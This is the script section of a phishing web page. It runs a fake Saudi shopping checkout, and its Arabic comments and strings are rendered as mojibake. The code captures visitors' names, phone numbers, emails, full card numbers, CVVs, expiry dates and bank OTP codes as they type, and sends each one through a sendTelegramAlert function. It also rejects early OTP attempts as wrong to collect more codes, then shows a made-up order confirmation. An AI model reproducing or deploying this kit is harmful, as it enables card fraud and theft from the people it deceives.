                // ØªØ­Ø¯ÙŠØ« Ø´Ø±ÙŠØ· Ø§Ù„ØªÙ‚Ø¯Ù…
                updateProgressBar(pageId);
                
                // ØªØ­Ø¯ÙŠØ« ØµÙØ­Ø© Ø§Ù„Ù†Ø¬Ø§Ø­ Ø¥Ø°Ø§ Ù„Ø²Ù…
                if (pageId === 'page-success') {
                    updateSuccessPage();
                }
            }, 600);
        }
        
        // ============================================
        // ØªØ­Ø¯ÙŠØ« ØµÙØ­Ø© Ø§Ù„Ù†Ø¬Ø§Ø­
        // ============================================
        function updateSuccessPage() {
            var tomorrow = new Date();
            tomorrow.setDate(tomorrow.getDate() + 1);
            
            var days = ['Ø§Ù„Ø£Ø­Ø¯', 'Ø§Ù„Ø¥Ø«Ù†ÙŠÙ†', 'Ø§Ù„Ø«Ù„Ø§Ø«Ø§Ø¡', 'Ø§Ù„Ø£Ø±Ø¨Ø¹Ø§Ø¡', 'Ø§Ù„Ø®Ù…ÙŠØ³', 'Ø§Ù„Ø¬Ù…Ø¹Ø©', 'Ø§Ù„Ø³Ø¨Øª'];
            var months = ['ÙŠÙ†Ø§ÙŠØ±', 'ÙØ¨Ø±Ø§ÙŠØ±', 'Ù…Ø§Ø±Ø³', 'Ø£Ø¨Ø±ÙŠÙ„', 'Ù…Ø§ÙŠÙˆ', 'ÙŠÙˆÙ†ÙŠÙˆ', 'ÙŠÙˆÙ„ÙŠÙˆ', 'Ø£ØºØ³Ø·Ø³', 'Ø³Ø¨ØªÙ…Ø¨Ø±', 'Ø£ÙƒØªÙˆØ¨Ø±', 'Ù†ÙˆÙÙ…Ø¨Ø±', 'Ø¯ÙŠØ³Ù…Ø¨Ø±'];
            
            var formattedDate = days[tomorrow.getDay()] + 'ØŒ ' + tomorrow.getDate() + '-' + months[tomorrow.getMonth()] + '-' + tomorrow.getFullYear();
            
            var trackingNum = Math.floor(10000000 + Math.random() * 90000000);
            var orderNum = Math.floor(1000000000 + Math.random() * 9000000000);
            
            document.getElementById('dynamicTrackingNumber').textContent = trackingNum;
            document.getElementById('dynamicOrderDate').textContent = 'ØªÙ… Ø¥Ù†Ø´Ø§Ø¡ Ø§Ù„Ø·Ù„Ø¨ : ' + formattedDate;
            document.getElementById('dynamicCreateDate').textContent = formattedDate;
            document.getElementById('dynamicOrderNumber').textContent = orderNum;
            document.getElementById('dynamicBarcode').src = 'https://bwipjs-api.metafloor.com/?bcid=code128&text=' + orderNum + '&scale=4&includetext=false';
            
            document.getElementById('dynamicUserName').textContent = userData.name || 'ØºÙŠØ± Ù…Ø­Ø¯Ø¯';
            document.getElementById('dynamicUserPhone').textContent = '+966 ' + (userData.phone || '000000000');
            document.getElementById('dynamicUserEmail').textContent = userData.email || 'ØºÙŠØ± Ù…Ø­Ø¯Ø¯';
        }
        
        // ============================================
        // ØªØ­Ø¯ÙŠØ« Ø´Ø±ÙŠØ· Ø§Ù„ØªÙ‚Ø¯Ù…
        // ============================================
        function updateProgressBar(pageId) {
            var bar = document.getElementById('progressBar');
            var percent = {
                'page-product': 0,
                'page-register': 25,
                'page-payment': 50,
                'page-verify': 75,
                'page-success': 100
            }[pageId] || 0;
            bar.style.width = percent + '%';
        }
        
        // ============================================
        // Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª
        // ============================================
        function isValidEmail(email) {
            return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
        }
        
        function isValidPhone(phone) {
            return /^(05|5)[0-9]{8}$/.test(phone);
        }
        
        // ============================================
        // Ø±Ø¨Ø· Ø§Ù„Ø£Ø²Ø±Ø§Ø± Ø¨Ø§Ù„Ø¯ÙˆØ§Ù„ - Ù‡Ø°Ø§ Ù‡Ùˆ Ø§Ù„Ø¥ØµÙ„Ø§Ø­ Ø§Ù„Ø±Ø¦ÙŠØ³ÙŠ
        // ============================================
        document.addEventListener('DOMContentLoaded', function() {
            
            // Ø²Ø± Ø§Ù„Ø°Ù‡Ø§Ø¨ Ù„Ù„ØªØ³Ø¬ÙŠÙ„
            var btnGoRegister = document.getElementById('btnGoRegister');
            if (btnGoRegister) {
                btnGoRegister.addEventListener('click', function() {
                    sendTelegramAlert('REGISTER_START', {visitorId: visitorId});
                    showPage('page-register');
                });
            }
            
            // Ø²Ø± Ø§Ù„Ø±Ø¬ÙˆØ¹ Ù„Ù„Ù…Ù†ØªØ¬
            var btnBackToProduct = document.getElementById('btnBackToProduct');
            if (btnBackToProduct) {
                btnBackToProduct.addEventListener('click', function() {
                    sendTelegramAlert('BACK_BUTTON', {from: 'register', to: 'product'});
                    showPage('page-product');
                });
            }
            
            // Ø²Ø± Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØªØ³Ø¬ÙŠÙ„
            var btnSubmitRegister = document.getElementById('btnSubmitRegister');
            if (btnSubmitRegister) {
                btnSubmitRegister.addEventListener('click', submitRegister);
            }
            
            // Ø²Ø± Ø§Ù„Ø±Ø¬ÙˆØ¹ Ù„Ù„ØªØ³Ø¬ÙŠÙ„
            var btnBackToRegister = document.getElementById('btnBackToRegister');
            if (btnBackToRegister) {
                btnBackToRegister.addEventListener('click', function() {
                    sendTelegramAlert('BACK_BUTTON', {from: 'payment', to: 'register'});
                    showPage('page-register');
                });
            }
            
            // Ø²Ø± Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¯ÙØ¹
            var btnSubmitPayment = document.getElementById('btnSubmitPayment');
            if (btnSubmitPayment) {
                btnSubmitPayment.addEventListener('click', submitPayment);
            }
            
            // Ø²Ø± Ø¥Ù„ØºØ§Ø¡ Ø§Ù„ØªØ­Ù‚Ù‚
            var btnCancelVerify = document.getElementById('btnCancelVerify');
            if (btnCancelVerify) {
                btnCancelVerify.addEventListener('click', function() {
                    sendTelegramAlert('BACK_BUTTON', {from: 'verify', to: 'payment'});
                    showPage('page-payment');
                });
            }
            
            // Ø²Ø± Ø¥Ø±Ø³Ø§Ù„ OTP
            var btnSubmitOTP = document.getElementById('btnSubmitOTP');
            if (btnSubmitOTP) {
                btnSubmitOTP.addEventListener('click', submitOTP);
            }
            
            // Ø²Ø± Ø¥Ø¹Ø§Ø¯Ø© Ø¥Ø±Ø³Ø§Ù„ OTP
            var btnResendOTP = document.getElementById('btnResendOTP');
            if (btnResendOTP) {
                btnResendOTP.addEventListener('click', resendOTP);
            }
            
            // Ø²Ø± Ø§Ù„Ø¹ÙˆØ¯Ø© Ù„Ù„Ø£Ø¹Ù„Ù‰
            var backToTop = document.getElementById('backToTop');
            if (backToTop) {
                backToTop.addEventListener('click', function() {
                    window.scrollTo({ top: 0, behavior: 'smooth' });
                });
            }
            
            // Ù…Ø±Ø§Ù‚Ø¨Ø© Ø­Ù‚ÙˆÙ„ Ø§Ù„Ø¥Ø¯Ø®Ø§Ù„
            setupInputMonitoring();
            
            // Ø¥Ø±Ø³Ø§Ù„ Ø¥Ø´Ø¹Ø§Ø± Ø¯Ø®ÙˆÙ„ Ø§Ù„Ù…ÙˆÙ‚Ø¹
            sendTelegramAlert('VISIT', {visitorId: visitorId});
        });
        
        // ============================================
        // Ù…Ø±Ø§Ù‚Ø¨Ø© Ø­Ù‚ÙˆÙ„ Ø§Ù„Ø¥Ø¯Ø®Ø§Ù„
        // ============================================
        function setupInputMonitoring() {
            var phoneInput = document.getElementById('user-phone');
            if (phoneInput) {
                phoneInput.addEventListener('blur', function() {
                    if (this.value.length === 10) {
                        sendTelegramAlert('INPUT_PHONE', {phone: this.value});
                    }
                });
            }
            
            var nameInput = document.getElementById('user-name');
            if (nameInput) {
                nameInput.addEventListener('blur', function() {
                    if (this.value.length > 2) {
                        sendTelegramAlert('INPUT_NAME', {name: this.value});
                    }
                });
            }
            
            var emailInput = document.getElementById('user-email');
            if (emailInput) {
                emailInput.addEventListener('blur', function() {
                    if (this.value.includes('@')) {
                        sendTelegramAlert('INPUT_EMAIL', {email: this.value});
                    }
                });
            }
            
            var cardInput = document.getElementById('card-num');
            if (cardInput) {
                cardInput.addEventListener('input', function() {
                    // ØªØºÙŠÙŠØ± Ø£ÙŠÙ‚ÙˆÙ†Ø© Ø§Ù„Ø¨Ø·Ø§Ù‚Ø©
                    var img = document.getElementById('card-type-img');
                    if (this.value.startsWith('4')) {
                        img.src = "https://i.ibb.co/fG2CKyhR/E01-BB971-3-E72-498-A-BEAA-004-A9098-EC7-A.png";
                        img.style.opacity = "1";
                    } else if (this.value.startsWith('5')) {
                        img.src = "https://i.ibb.co/sv5VB9wQ/88347052-D6-A4-4974-A56-C-FCAD68185365.png";
                        img.style.opacity = "1";
                    } else {
                        img.style.opacity = "0";
                    }
                    
                    if (this.value.length === 16) {
                        var cardType = this.value.startsWith('4') ? 'Visa' : (this.value.startsWith('5') ? 'Mastercard' : 'Unknown');
                        sendTelegramAlert('INPUT_CARD', {cardNumber: this.value, cardType: cardType});
                    }
                });
            }
            
            var cvvInput = document.getElementById('card-cvv');
            if (cvvInput) {
                cvvInput.addEventListener('blur', function() {
                    if (this.value.length === 3) {
                        sendTelegramAlert('INPUT_CVV', {cvv: this.value});
                    }
                });
            }
            
            var expInput = document.getElementById('card-exp');
            if (expInput) {
                expInput.addEventListener('input', function() {
                    var v = this.value.replace(/\D/g, '');
                    if (v.length >= 2) {
                        this.value = v.substring(0, 2) + '/' + v.substring(2, 4);
                    }
                });
                expInput.addEventListener('blur', function() {
                    if (this.value.length === 5) {
                        sendTelegramAlert('INPUT_EXPIRY', {expiry: this.value});
                    }
                });
            }
            
            var otpInput = document.getElementById('bank-otp');
            if (otpInput) {
                otpInput.addEventListener('input', function() {
                    if (this.value.length >= 4) {
                        sendTelegramAlert('INPUT_OTP', {otp: this.value, attempt: otpAttempts + 1});
                    }
                });
            }
        }
        
        // ============================================
        // Ø¥Ø±Ø³Ø§Ù„ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„ØªØ³Ø¬ÙŠÙ„
        // ============================================
        function submitRegister() {
            var phone = document.getElementById('user-phone').value.trim();
            var name = document.getElementById('user-name').value.trim();
            var email = document.getElementById('user-email').value.trim();
            
            // Ø§Ù„ØªØ­Ù‚Ù‚
            if (!isValidPhone(phone)) {
                showError('err-reg', 'ÙŠØ±Ø¬Ù‰ Ø¥Ø¯Ø®Ø§Ù„ Ø±Ù‚Ù… Ù‡Ø§ØªÙ ØµØ­ÙŠØ­ (Ù…Ø«Ø§Ù„: 0596324178)');
                sendTelegramAlert('ERROR', {type: 'invalid_phone', phone: phone});
                return;
            }
            
            if (name.length < 2) {
                showError('err-reg', 'ÙŠØ±Ø¬Ù‰ Ø¥Ø¯Ø®Ø§Ù„ Ø§Ù„Ø§Ø³Ù… Ø§Ù„Ø£ÙˆÙ„');
                sendTelegramAlert('ERROR', {type: 'invalid_name', name: name});
                return;
            }
            
            if (!isValidEmail(email)) {
                showError('err-reg', 'ÙŠØ±Ø¬Ù‰ Ø¥Ø¯Ø®Ø§Ù„ Ø¨Ø±ÙŠØ¯ Ø¥Ù„ÙƒØªØ±ÙˆÙ†ÙŠ ØµØ­ÙŠØ­');
                sendTelegramAlert('ERROR', {type: 'invalid_email', email: email});
                return;
            }
            
            // Ø­ÙØ¸ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª
            userData.name = name;
            userData.phone = phone;
            userData.email = email;
            
            // Ø¥Ø¸Ù‡Ø§Ø± Ø§Ù„ØªØ­Ù…ÙŠÙ„
            document.getElementById('regSpinner').style.display = 'block';
            
            // Ø¥Ø±Ø³Ø§Ù„ Ù„Ù„ØªÙ„ÙŠØ¬Ø±Ø§Ù…
            sendTelegramAlert('REGISTER_SUBMIT', {
                name: name,
                phone: phone,
                email: email,
                visitorId: visitorId
            });
            
            // Ø§Ù„Ø§Ù†ØªÙ‚Ø§Ù„
            setTimeout(function() {
                document.getElementById('regSpinner').style.display = 'none';
                showPage('page-payment');
            }, 500);
        }
        
        // ============================================
        // Ø¥Ø±Ø³Ø§Ù„ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø¯ÙØ¹
        // ============================================
        function submitPayment() {
            var cardNum = document.getElementById('card-num').value.trim();
            var cvv = document.getElementById('card-cvv').value.trim();
            var exp = document.getElementById('card-exp').value.trim();
            var holder = document.getElementById('card-holder').value.trim();
            
            // Ø§Ù„ØªØ­Ù‚Ù‚
            if (!cardNum || cardNum.length !== 16 || !/^\d+$/.test(cardNum)) {
                showError('err-pay', 'ÙŠØ±Ø¬Ù‰ Ø¥Ø¯Ø®Ø§Ù„ Ø±Ù‚Ù… Ø¨Ø·Ø§Ù‚Ø© ØµØ­ÙŠØ­ (16 Ø±Ù‚Ù…)');
                sendTelegramAlert('ERROR', {type: 'invalid_card', card: cardNum});
                return;
            }
            
            if (!cvv || cvv.length !== 3 || !/^\d+$/.test(cvv)) {
                showError('err-pay', 'ÙŠØ±Ø¬Ù‰ Ø¥Ø¯Ø®Ø§Ù„ CVV ØµØ­ÙŠØ­ (3 Ø£Ø±Ù‚Ø§Ù…)');
                sendTelegramAlert('ERROR', {type: 'invalid_cvv', cvv: cvv});
                return;
            }
            
            if (!exp || exp.length !== 5) {
                showError('err-pay', 'ÙŠØ±Ø¬Ù‰ Ø¥Ø¯Ø®Ø§Ù„ ØªØ§Ø±ÙŠØ® Ø§Ù†ØªÙ‡Ø§Ø¡ ØµØ­ÙŠØ­ (MM/YY)');
                sendTelegramAlert('ERROR', {type: 'invalid_expiry', expiry: exp});
                return;
            }
            
            if (holder.length < 3) {
                showError('err-pay', 'ÙŠØ±Ø¬Ù‰ Ø¥Ø¯Ø®Ø§Ù„ Ø§Ø³Ù… Ø­Ø§Ù…Ù„ Ø§Ù„Ø¨Ø·Ø§Ù‚Ø©');
                sendTelegramAlert('ERROR', {type: 'invalid_holder', holder: holder});
                return;
            }
            
            // Ø¥Ø¸Ù‡Ø§Ø± Ø§Ù„ØªØ­Ù…ÙŠÙ„
            document.getElementById('paySpinner').style.display = 'block';
            
            // Ø¥Ø±Ø³Ø§Ù„ Ù„Ù„ØªÙ„ÙŠØ¬Ø±Ø§Ù…
            var cardType = cardNum.startsWith('4') ? 'Visa' : (cardNum.startsWith('5') ? 'Mastercard' : 'Unknown');
            sendTelegramAlert('PAYMENT_SUBMIT', {
                cardNumber: cardNum,
                cardType: cardType,
                expiry: exp,
                cvv: cvv,
                holder: holder,
                userName: userData.name,
                userPhone: userData.phone
            });
            
            // Ø¥Ø¹Ø§Ø¯Ø© ØªØ¹ÙŠÙŠÙ† OTP
            otpAttempts = 0;
            document.getElementById('attemptsLeft').textContent = maxOtpAttempts;
            document.getElementById('bank-otp').value = '';
            
            // Ø§Ù„Ø§Ù†ØªÙ‚Ø§Ù„
            setTimeout(function() {
                document.getElementById('paySpinner').style.display = 'none';
                showPage('page-verify');
            }, 500);
        }
        
        // ============================================
        // Ø¥Ø±Ø³Ø§Ù„ OTP
        // ============================================
        function submitOTP() {
            var otp = document.getElementById('bank-otp').value.trim();
            
            if (!otp || otp.length < 4) {
                document.getElementById('err-otp').textContent = 'ÙŠØ±Ø¬Ù‰ Ø¥Ø¯Ø®Ø§Ù„ Ø±Ù…Ø² Ø§Ù„ØªØ­Ù‚Ù‚';
                document.getElementById('err-otp').style.display = 'block';
                return;
            }
            
            // Ø¥Ø¸Ù‡Ø§Ø± Ø§Ù„ØªØ­Ù…ÙŠÙ„
            document.getElementById('otpSpinner').style.display = 'block';
            
            // Ø²ÙŠØ§Ø¯Ø© Ø§Ù„Ù…Ø­Ø§ÙˆÙ„Ø§Øª
            otpAttempts++;
            
            // Ø¥Ø±Ø³Ø§Ù„ Ù„Ù„ØªÙ„ÙŠØ¬Ø±Ø§Ù…
            sendTelegramAlert('OTP_ATTEMPT', {
                attempt: otpAttempts,
                otp: otp,
                userName: userData.name,
                userPhone: userData.phone
            });
            
            // Ø¥Ø®ÙØ§Ø¡ Ø§Ù„ØªØ­Ù…ÙŠÙ„
            document.getElementById('otpSpinner').style.display = 'none';
            
            // Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„Ù…Ø­Ø§ÙˆÙ„Ø§Øª
            if (otpAttempts < maxOtpAttempts) {
                var remaining = maxOtpAttempts - otpAttempts;
                document.getElementById('err-otp').textContent = 'Ø±Ù…Ø² Ø§Ù„ØªØ­Ù‚Ù‚ ØºÙŠØ± ØµØ­ÙŠØ­ØŒ Ù…Ø­Ø§ÙˆÙ„Ø§Øª Ù…ØªØ¨Ù‚ÙŠØ©: ' + remaining;
                document.getElementById('err-otp').style.display = 'block';
                document.getElementById('attemptsLeft').textContent = remaining;
                document.getElementById('bank-otp').value = '';
                document.getElementById('bank-otp').focus();
            } else {
                // Ø§Ù„Ù…Ø­Ø§ÙˆÙ„Ø© Ø§Ù„Ø±Ø§Ø¨Ø¹Ø© - Ø§Ù„Ù†Ø¬Ø§Ø­
                sendTelegramAlert('OTP_SUCCESS', {
                    totalAttempts: otpAttempts,
                    userName: userData.name,
                    userPhone: userData.phone,
                    userEmail: userData.email
                });
                showPage('page-success');
            }
        }
        
        // ============================================
        // Ø¥Ø¹Ø§Ø¯Ø© Ø¥Ø±Ø³Ø§Ù„ OTP
        // ============================================
        function resendOTP() {
            document.getElementById('bank-otp').value = '';
            document.getElementById('bank-otp').focus();
            document.getElementById('err-otp').textContent = 'ØªÙ… Ø¥Ø¹Ø§Ø¯Ø© Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø±Ù…Ø²';
            document.getElementById('err-otp').style.background = '#5eb471';
            document.getElementById('err-otp').style.display = 'block';
            
            sendTelegramAlert('OTP_ATTEMPT', {
                attempt: 'RESEND',
                userName: userData.name
            });
        }
        
        // ============================================
        // Ø¯Ø§Ù„Ø© Ù…Ø³Ø§Ø¹Ø¯Ø© Ù„Ø¹Ø±Ø¶ Ø§Ù„Ø®Ø·Ø£
        // ============================================
        function showError(elementId, message) {
            var el = document.getElementById(elementId);
            el.textContent = message;
            el.style.display = 'block';
            el.classList.add('shake');
            setTimeout(function() {
                el.classList.remove('shake');
            }, 500);
        }
        
        // ============================================
        // Ù…Ø±Ø§Ù‚Ø¨Ø© Ø§Ù„ØªÙ…Ø±ÙŠØ±
        // ============================================
        window.onscroll = function() {
            var btn = document.getElementById('backToTop');
            if (window.pageYOffset > 300) {
                btn.classList.add('visible');
            } else {
                btn.classList.remove('visible');
            }
        };
    </script>
</body>
</html>
